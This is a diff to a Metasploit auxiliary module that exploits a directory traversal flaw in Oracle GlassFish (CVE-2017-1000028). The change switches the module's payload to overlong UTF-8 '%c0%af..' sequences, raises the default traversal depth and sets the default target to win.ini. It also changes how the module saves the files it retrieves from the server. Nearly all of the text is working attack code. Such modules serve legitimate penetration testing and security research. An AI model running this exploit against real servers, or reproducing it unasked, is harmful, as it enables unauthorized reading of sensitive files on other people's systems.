@@ -18,6 +18,8 @@ class MetasploitModule < Msf::Auxiliary
       },
       'References'  =>
         [
+          ['CVE', '2017-1000028'],
+          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'],
           ['EDB', '39441']
         ],
       'Author'      =>
@@ -27,39 +29,38 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DisclosureDate' => 'Aug 08 2015',
       'License'     => MSF_LICENSE
-      ))
+    ))
 
-  register_options(
+register_options(
       [
         Opt::RPORT(4848),
-        OptString.new('FILEPATH', [true, "The path to the file to read", '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini']),
-        OptInt.new('DEPTH', [ true, 'Path Traversal Depth', 10 ])
+        OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
+        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])
       ])
   end
 
     def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = "..%5d" * datastore['DEPTH'] << filename
+    traversal = "%c0%af.." * datastore['DEPTH'] << filename
 
     res = send_request_raw({
       'method' => 'GET',
       'uri'    => "/theme/META-INF/prototype#{traversal}"
     })
 
-    if res && res.code == 200
-      print_good("#{res.body}")
-
-      path = store_loot(
-        'oracle.glassfish',
-        'text/plain',
-        ip,
-        res,
-        filename
-      )
-
-      print_good("File saved at: #{path}")
-    else
-      print_error("Nothing was downloaded")
+    unless res && res.code == 200
+      print_error('Nothing was downloaded')
+      return
     end
+
+    vprint_good("#{peer} - #{res.body}")
+    path = store_loot(
+      'oracle.traversal',
+      'text/plain',
+      ip,
+      res.body,
+      filename
+    )
+    print_good("File saved in: #{path}")
   end
 end
